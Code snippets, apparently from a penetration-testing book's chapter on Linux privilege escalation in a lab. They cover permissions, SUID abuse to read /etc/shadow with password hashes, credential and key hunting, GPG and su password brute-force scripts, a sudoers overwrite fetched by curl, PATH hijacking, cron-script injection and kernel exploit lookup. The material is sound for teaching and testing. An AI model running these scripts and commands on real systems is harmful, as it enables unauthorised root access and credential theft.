["```\n$ **ls -l /etc/passwd**\n\n**-rw-r--r--**1 **root root** 1341 Jun 28 01:11 /etc/passwd \n```", "```\n$ **cd ~**\n$ **touch my_new_file.txt** \n```", "```\n$ **chown kali:kali my_new_file.txt**\n```", "```\n$ **chmod u+rwx,g+r,o+r my_new_file.txt**\n$ **ls -l my_new_file.txt**\n\n-rwxr--r-- 1 kali kali 0 Jun 27 22:28 my_new_file.txt \n```", "```\n$ **chmod 400 my_new_file.txt**\n$ **ls -l my_new_file.txt**\n\n-r-------- 1 kali kali 0 Jun 27 22:30 my_new_file.txt \n```", "```\n$ **sudo groupadd sysadmins**\n$ **sudo useradd eve -G sysadmins**\n$ **sudo useradd alice -G sysadmins**\n$ **sudo useradd bob -G sysadmins** \n```", "```\n$ **touch facl_example.txt**\n$ **getfacl facl_example.txt**\n\n# file: facl_example.txt\n# owner: kali\n# group: kali\n\nuser::rw-\ngroup::r--\nother::r-- \n```", "```\n$ **touch facl_example.txt**\n$ **setfacl -m g:sysadmins:r-- facl_example.txt** \n```", "```\n$ **setfacl -m u:eve:--- facl_example.txt**\n```", "```\n$ **getfacl facl_example.txt**\n\n# file: facl_example.txt\n# owner: kali\n# group: kali\n\nuser::rwx\nuser:eve:---\ngroup::r--\ngroup:sysadmins:r--\nmask::r--\nother::r-- \n```", "```\n-rw-r--r--**+** 1 kali kali    0 Jun 27 22:52 facl_example.txt\n```", "```\n$ **ls -l /usr/bin/at**\n\n-rw**s**r-**s**r-x 1 daemon daemon 59768 Oct 15 /usr/bin/at \n```", "```\n$ **ls -ld /tmp**\n\ndrwxrwxrw**t** 11 root root 4096 Jun 28 21:58 /tmp \n```", "```\n$ **mkdir /tmp/test**\n$ **chmod +t /tmp/test**\n$ **ls -ld /tmp/test**\n\ndrwxr-xr-t 2 kali kali 4096 Jun 28 22:06 /tmp/test \n```", "```\n$ **cp /usr/bin/ping /tmp/ping.backup**\n$ **ls -l /tmp/ping.backup**\n\n-rwxr-xr-x 1 kali kali 90568 Jun 28 22:21 /tmp/ping.backup \n```", "```\n$ **chmod 4700 /tmp/ping.backup**\n\n$ **ls -l /tmp/ping.backup**\n\n-rws------ 1 kali kali 90568 Jun 28 22:21 /tmp/ping.backup \n```", "```\n$ **find / -perm -o=r**\n```", "```\n$ **find / -type f -perm -o=r**\n$ **find / -type d -perm -o=r** \n```", "```\n$ **find / -perm -o=r 2> /dev/null**\n```", "```\n$ **find / -perm -o=w**\n```", "```\n$ **find / -perm -o=x**\n```", "```\n$ **find / -type f -perm -o=rwx**\n```", "```\n$ **find / -perm -4000 2> /dev/null**\n```", "```\n$ **find / -perm -2000 2> /dev/null**\n```", "```\n$ **find / -perm -1000 2> /dev/null**\n```", "```\n$ **stat /usr/bin/elinks**\n\n  File: /usr/bin/elinks\n  Size: 1759424       Blocks: 3440       IO Block: 4096   regular file\nDevice: 0,57 Inode:  4763007             Links: 1\nAccess: **(4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)**\n`--snip--` \n```", "```\n$ **elinks --help**\n\nUsage: elinks [OPTION]... [URL]...\nOptions:\n  -anonymous [0|1]      Restrict to anonymous mode\n  -auto-submit [0|1]    Autosubmit first form\n  -base-session <num>   Clone internal session with given ID\n`--snip--` \n```", "```\n$ **elinks https://google.com -dump 1**\n```", "```\n$ **elinks file:///etc/shadow -dump 1**\n\nroot:*:19523:0:99999:7::: daemon:*:19523:0:99999:7:::\njmartinez:$y$j9T$jHIwZ8SKS4GGK9GrHOHTu.$rOJY2gSlP6ZgN2IB0qoW0oBFgs6DWiBH\nacroSQw8Ir7:19536:0:99999:7:::\ndbrown:$y$j9T$hDNnbY/r00FC/jeE4BfCL1$6HbLxT8T7D6sUebz1T0fp0xdTjIjVoWjTLM\nDMdiHZBD:19536:0:99999:7:::\nogarcia:$y$j9T$aiqqNSE8dqtvZ62otyoOB/$2mLRlxi4iSlJxV5qTjbqdKSVyc4aGFKtpz\npn4YjZNID:19536:0:99999:7:::\narodriguez:$y$j9T$htdo8u5CtRaOiHkFxx.s7/$lzBMPHzw96si.CI3eIFjJj0FfdqwgNH\nefhya0VpQso.:19536:0:99999:7:::\n`--snip--` \n```", "```\n$ **find . -type f -exec grep -i password {} \\;**\n```", "```\n$ **find . -type f -exec grep -i \"api_key\\|token\\|apitoken\\|key\" {} \\;**\n```", "```\n$ **find . -type f -name \"*.hashes\" -o -name \"*.env\" -o -name \"*.credentials\"**\n```", "```\nid: github-oauth-token\n\ninfo:\n  name: Github OAuth Access Token\n  author: tanq16\n  severity: high\n  tags: token,file,github\n\nfile:\n  - extensions:\n      - all\n\n    extractors:\n      - type: regex\n        regex:\n          **- \"gho_.{36}\"** \n```", "```\n$ **grep -E 'gho_.{36}' somefile.txt**\n```", "```\n$ **egrep 'gho_.{36}' somefile.txt**\n```", "```\n$ **grep -R 'gho_.{36}' /some_directory**\n```", "```\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAqcqpBTfIwqwiFtOvM1DlTEplYuwYyrc4OBOBR2Wz6ItsX+cA/zV4\n`--snip--`\n-----END OPENSSH PRIVATE KEY----- \n```", "```\n-----BEGIN SSH2 PRIVATE KEY-----\n-----BEGIN OPENSSH PRIVATE KEY-----\n-----BEGIN PRIVATE KEY-----\n-----BEGIN RSA PRIVATE KEY-----\n-----BEGIN DSA PRIVATE KEY-----\n-----BEGIN EC PRIVATE KEY----- \n```", "```\n$ **grep -R -- \"-----BEGIN\" /some_directory**\n```", "```\n-----BEGIN PGP PRIVATE KEY BLOCK-----\nlQVYBGSeRngBDACyE/xXrs89ek7Qcrx0rpupVWkBwv5cZJX3SF64mUlmRWckEBMB\nO8STBlgCVixH7pw5Ke0UPFwOInZMzqAYWuqHwr6MJOVYzhVeEJWIbnAH/7ioh0ti\n`--snip--`\n-----END PGP PRIVATE KEY BLOCK----- \n```", "```\n$ **gpg --list-keys**\n```", "```\n`--snip--`\n/root/.gnupg/pubring.kbx\n------------------------\npub   rsa3072\n\n      9DD565D2BB63D9241ACF9F61671507A368BFDC40\nuid           [ultimate] arodriguez@acme-infinity-servers.com\nsub   rsa3072 [E] \n```", "```\n$ **gpg --output private.pgp --armor --export-secret-key arodriguez@acme-infinity-servers.com**\n```", "```\nserver {\n    listen              443 ssl;\n    server_name         example.com;\n **ssl_certificate     example.com.rsa.crt;**\n **ssl_certificate_key example.com.rsa.key;**\n} \n```", "```\n<VirtualHost *:443>\n   ServerName example.com\n   DocumentRoot /var/www/example.com\n\n   SSLEngine on\n **SSLCertificateFile /etc/ssl/certs/apache-selfsigned.crt**\n **SSLCertificateKeyFile /etc/ssl/private/apache-selfsigned.key**\n</VirtualHost> \n```", "```\nfrontend www.example.com\n  **bind *:443 ssl crt  /etc/haproxy/certs/example_com.pem**\n  reqadd X-Forwarded-Proto:\\ https\n  default_backend backend_http \n```", "```\nbackend web_servers\n    balance roundrobin\n **server server1 10.0.1.3:443 check maxconn 20 ssl ca-file /etc/ssl/certs/ca.pem**\n **server server2 10.0.1.4:443 check maxconn 20 ssl ca-file /etc/ssl/certs/ca.pem** \n```", "```\n#!/bin/bash\n❶ KEY_ID=\"identity@blackhatbash.com\"\n\n❷ if ! gpg --list-keys | grep uid | grep -q \"${KEY_ID}\"; then\n  echo \"Could not find identity/key ID ${KEY_ID}\"\n  exit 1\nfi\n\nwhile read -r passphrase; do\n  echo \"Brute forcing with ${passphrase}...\"\n❸ if echo \"${passphrase}\" | gpg --batch \\\n                                --yes \\\n                                --pinentry-mode loopback \\\n                                --passphrase-fd 0 \\\n                                --output private.pgp \\\n                                --armor \\\n                                --export-secret-key \"${KEY_ID}\"; then\n       echo \"Passphrase is: ${passphrase}\"\n       echo \"Private key is located at private.pgp\"\n       exit 0\n  fi\ndone < passphrases.txt \n```", "```\n$ **sudo -l**\n```", "```\n[sudo] password for kali:\nMatching Defaults entries for kali on kali:\n    env_reset, mail_badpass,\n   secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser kali may run the following commands on kali:\n    **(ALL : ALL) ALL** \n```", "```\n$ **sudo cat /etc/sudoers**\n\n`--snip--`\n@includedir /etc/sudoers.d \n```", "```\n$ **ls -ld /etc/sudoers**\n\n-r--r----- 1 root root 1714 Feb 18 07:03 /etc/sudoers \n```", "```\n$ **sudo cat /etc/sudoers.d/kali-grant-root**\n\n# Allow members of group kali-trusted to execute any command without a\n# password prompt.\n\n**%kali-trusted   ALL=(ALL:ALL) NOPASSWD: ALL** \n```", "```\n$ **sudo cat /etc/sudoers**\n# Allow members of group sudo to execute any command.\n\n%sudo    ALL=(ALL:ALL) ALL \n```", "```\n$ **groups**\n\nkali adm dialout cdrom floppy **sudo** audio dip video plugdev users\nnetdev bluetooth scanner wireshark kaboxer vboxsf docker \n```", "```\n$ **sudo -l**\n\nUser backup may run the following commands on p-jumpbox-01:\n    (ALL : ALL) /usr/bin/vi\n    (ALL : ALL) /usr/bin/curl \n```", "```\n$ **sudo vi /etc/demo.txt**\n```", "```\n$ **python3 -m http.server 8080**\n```", "```\n$ **sudo curl -s http://172.16.10.1:8080/add-sudo-to-user -o /etc/sudoers.d/add-sudo-to-user**\n```", "```\n$ **echo $PATH**\n\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \n```", "```\n$ **PATH=$PATH:/data/scripts**\n$ **echo $PATH**\n\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/data/scripts \n```", "```\n$ **PATH=.:$PATH**\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(void)\n    // This has the potential to get hijacked.\n  ❶ system(\"whoami\");\n\n    // This should not be possible to hijack.\n  ❷ system(\"/usr/bin/whoami\");\n    return 0;\n} \n```", "```\n$ **gcc getuser.c -o getuser**\n```", "```\n$ **chmod u+x getuser**\n```", "```\n$ **PATH=\"$(pwd):$PATH\"**\n$ **echo $PATH**\n**/tmp**:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \n```", "```\n$ **echo \"#!/bin/bash\" >> whoami**\n$ **echo \"I am not the whoami you were looking for!\" >> whoami**\n$ **chmod u+x whoami** \n```", "```\n$ **./getuser**\n\nI am not the whoami you were looking for!\nroot \n```", "```\n$ **cat /etc/crontab**\n\n`--snip--`\n*/5 * * * * root bash /scripts/backup_data.sh \n```", "```\n$ **ls -l /scripts/backup_data.sh**\n\n-rw-r--r-- 1 root root 508 Jul  4 02:50 /scripts/backup_data.sh \n```", "```\n#!/bin/bash\n❶ CURRENT_DATE=$(date +%y-%m-%d)\n\nif [[! -d \"/data/backup\"]]; then\n  mkdir -p /data/backup\nfi\n\n# Look for external instructions if they exist.\n❷ for directory in \"/tmp\" \"/data\"; do\n❸ if [[-f \"${directory}/extra_cmds.sh\"]]; then\n  ❹ source \"${directory}/extra_cmds.sh\"\n  fi\ndone\n\n# Back up the data directory.\necho \"Backing up /data/backup - ${CURRENT_DATE}\"\n\n❺ tar czvf \"/data/backup-${CURRENT_DATE}.tar.gz\" /data/backup\nrm -rf /data/backup/*\n\necho \"Done.\" \n```", "```\n#!/bin/bash\n\necho \"The running user is: $(whoami)\" >> /tmp/proof-of-concept \n```", "```\n$ **ls -l**\n-rwxr--r-- 1 root root 104 Jul  4 03:24 extra_cmds.sh\n-rw-r--r-- 1 root root  26 Jul  4 03:25 proof-of-concept\n\n$ **cat proof-of-concept**\nThe running user is: root \n```", "```\n$ **uname -r -v**\n\n6.x.x-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.x.xx-1kali2 \n```", "```\n$ **searchsploit linux kernel | grep -i \"dirty cow\"**\n\nLinux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)\nLinux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)\nLinux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Es...\nLinux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation\nLinux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)\nLinux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation\nLinux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method) \n```", "```\n$ **perl /home/kali/tools/linux-exploit-suggester-2/linux-exploit-suggester-2.pl**\n\n  #############################\n    Linux Exploit Suggester 2\n  #############################\n\n  Local Kernel: 6.x.x\n  Searching 72 exploits...\n\n  Possible Exploits\n\n  No exploits are available for this kernel version \n```", "```\n$ **grep \"/bin/bash\" /etc/passwd | grep -v \"backup:x\"**\n\nroot:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\njmartinez:x:1001:1001::/home/jmartinez:/bin/bash\ndbrown:x:1002:1002::/home/dbrown:/bin/bash\nogarcia:x:1003:1003::/home/ogarcia:/bin/bash\narodriguez:x:1004:1004::/home/arodriguez:/bin/bash \n```", "```\n#!/bin/bash\n❶ USER=\"jmartinez\"\n❷ PASSWORD_FILE=\"passwords.txt\"\n\nif [[! -f \"${PASSWORD_FILE}\"]]; then\n  echo \"password file does not exist.\"\n  exit 1\nfi\n\n❸ while read -r password; do\n  echo \"Attempting password: ${password} against ${USER}...\"\n  if echo \"${password}\" | timeout 0.2 su - ${USER} \\\n          -c 'whoami' | grep -q \"${USER}\"; then\n    echo\n    echo \"SUCCESS! The password for ${USER} is ${password}\"\n    echo \"Use su - ${USER} and provide the password to switch\"\n    exit 0\n  fi\ndone < \"${PASSWORD_FILE}\"\n\necho \"Unable to compromise ${USER}.\"\nexit 1 \n```", "```\n$ **echo test >> passwords.txt**\n$ **echo test123 >> passwords.txt**\n$ **echo password123 >> passwords.txt**\n$ **echo admin >> passwords.txt** \n```", "```\n$ **bash local_account_bf.sh**\nAttempting password: test against jmartinez...\nPassword: Attempting password: test123 against jmartinez...\nPassword: Attempting password: password123 against jmartinez...\nPassword:\n**SUCCESS! The password for jmartinez is password123**\n\nUse su - jmartinez and provide the password to switch \n```", "```\n$ **su — jmartinez**\n```", "```\n$ **sudo -l**\n\nMatching Defaults entries for jmartinez on p-jumpbox-01:\n`--snip--`\nUser jmartinez may run the following commands on p-jumpbox-01:\n\n  **  (ALL : ALL) ALL** \n```", "```\n$ **sudo su**\n# **whoami**\n\nroot \n```", "```\n$ **./LinEnum.sh -t -k \"P@ssw0rd\"**\n```", "```\n$ **unix-privesc-check standard**\n```", "```\n$ **unix-privesc-check detailed**\n```", "```\n`--snip--`\n###########################################\nChecking cron job programs aren't writable (/var/spool/cron/crontabs)\n############################################\n\nNo user crontabs found in /var/spool/cron/crontabs.  Skipping checks.\n\n############################################\nChecking cron job programs aren't writable (/var/spool/cron/tabs)\n############################################\n\nDirectory /var/spool/cron/tabs is not present.  Skipping checks.\n\n############################################\nChecking inetd programs aren't writable\n############################################\n\nFile /etc/inetd.conf not present.  Skipping checks.\n`--snip--` \n```"]